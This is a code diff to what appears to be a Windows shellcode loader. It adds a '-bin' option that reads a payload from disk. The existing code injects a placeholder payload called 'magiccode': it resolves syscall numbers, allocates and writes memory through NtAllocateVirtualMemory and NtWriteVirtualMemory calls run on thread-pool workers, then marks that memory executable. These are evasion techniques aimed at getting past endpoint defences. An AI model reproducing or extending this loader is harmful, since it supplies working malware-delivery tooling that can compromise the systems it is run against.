@@ -390,8 +390,15 @@ WORD GetsyscallNum(LPVOID addr) {
 }
 
 
+// -bin: 
+unsigned char* magic_code = NULL;
+SIZE_T allocatedSize = 0; 
 
 unsigned char magiccode[] = ####SHELLCODE####;
+
+
+// -bin
+BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize);
 
 
 int main(int argc, char *argv[]) {
@@ -404,9 +411,44 @@ int main(int argc, char *argv[]) {
     ///
 
 
+    PCWSTR binPath = nullptr;
+
+    for (int i = 1; i < argc; ++i) {
+        if (strcmp(argv[i], "-bin") == 0) {
+            if (i + 1 >= argc || argv[i + 1][0] == '-') {
+                fprintf(stderr, "[-] Error: '-bin' flag requires a valid file path argument.\n");
+                fprintf(stderr, "    Usage: loader.exe <PID> -bin <path_to_magiccode>\n");
+                exit(1);
+            }
+
+            size_t wlen = strlen(argv[i + 1]) + 1;
+            wchar_t* wpath = new wchar_t[wlen];
+            mbstowcs(wpath, argv[i + 1], wlen);
+            binPath = wpath;
+            break;
+        }
+    }
+
+
+    // -bin
+    if (binPath) {
+        if (!ReadContents(binPath, &magic_code, &allocatedSize)) {
+            fprintf(stderr, "[-] Failed to read binary file\n");
+        } else {
+            printf("\033[32m[+] Read binary file successfully, size: %zu bytes\033[0m\n", allocatedSize);
+            // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
+        }
+    } else {
+        magic_code = magiccode; 
+        allocatedSize = sizeof(magiccode);
+        printf("\033[32m[+] Using default magiccode with size: %zu bytes\033[0m\n", allocatedSize);
+        // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
+    }
+
+    // -bin 
+
 
     LPVOID allocatedAddress = NULL;
-    SIZE_T allocatedsize = sizeof(magiccode);
 
     //print the first 8 bytes of the magiccode and the last 8 bytes:
     printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[0], magiccode[1], magiccode[2], magiccode[3], magiccode[4], magiccode[5], magiccode[6], magiccode[7]);
@@ -443,7 +485,7 @@ int main(int argc, char *argv[]) {
     ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) syscallAddr1;
     ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
     ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
-    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
+    ntAllocateVirtualMemoryArgs.size = &allocatedSize;
     ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;
 
 
@@ -461,7 +503,7 @@ int main(int argc, char *argv[]) {
     ((TPPOSTWORK)pTpPostWork)(WorkReturn);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
     // getchar();
-    printf("[+] Allocated size: %lu\n", allocatedsize);
+    printf("[+] Allocated size: %lu\n", allocatedSize);
     printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
 /// Write memory: 
     // if(allocatedAddress == NULL) {
@@ -469,9 +511,9 @@ int main(int argc, char *argv[]) {
     //     printf("allocatedAddress: %p\n", allocatedAddress);
     // }
     // printf("allocatedAddress: %p\n", allocatedAddress);
-    // if(allocatedsize != sizeof(magiccode)) {
+    // if(allocatedSize != sizeof(magiccode)) {
     //     printf("[-] Allocated size is not the same as magiccode size\n");
-    //     printf("[-] Allocated size: %lu\n", allocatedsize);
+    //     printf("[-] Allocated size: %lu\n", allocatedSize);
     //     printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
     // }
 
@@ -490,7 +532,7 @@ int main(int argc, char *argv[]) {
     ntWriteVirtualMemoryArgs.hProcess = (HANDLE)-1;
     ntWriteVirtualMemoryArgs.address = allocatedAddress;
     ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
-    ntWriteVirtualMemoryArgs.size = allocatedsize;
+    ntWriteVirtualMemoryArgs.size = allocatedSize;
     ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;
 
     // // // / Set workers
@@ -510,7 +552,7 @@ int main(int argc, char *argv[]) {
 
     // change allocatedAddress to execute read: 
     DWORD oldProtect;
-    VirtualProtect(allocatedAddress, allocatedsize, PAGE_EXECUTE_READ, &oldProtect);
+    VirtualProtect(allocatedAddress, allocatedSize, PAGE_EXECUTE_READ, &oldProtect);
     printf("[+] Memory changed to PAGE_EXECUTE_READ\n");
 
 
@@ -668,4 +710,42 @@ void SimpleSleep(DWORD dwMilliseconds)
         WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
         CloseHandle(hEvent); // Clean up the event object
     }
+}
+
+
+
+BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize)
+{
+    FILE* f = NULL;
+    _wfopen_s(&f, Filepath, L"rb");
+    if (!f) {
+        return FALSE;
+    }
+
+    fseek(f, 0, SEEK_END);
+    long fileSize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    if (fileSize <= 0) {
+        fclose(f);
+        return FALSE;
+    }
+
+    unsigned char* buffer = (unsigned char*)malloc(fileSize);
+    if (!buffer) {
+        fclose(f);
+        return FALSE;
+    }
+
+    size_t bytesRead = fread(buffer, 1, fileSize, f);
+    fclose(f);
+
+    if (bytesRead != fileSize) {
+        free(buffer);
+        return FALSE;
+    }
+
+    *magiccode = buffer;
+    *magiccodeSize = (SIZE_T)fileSize;
+    return TRUE;
 }
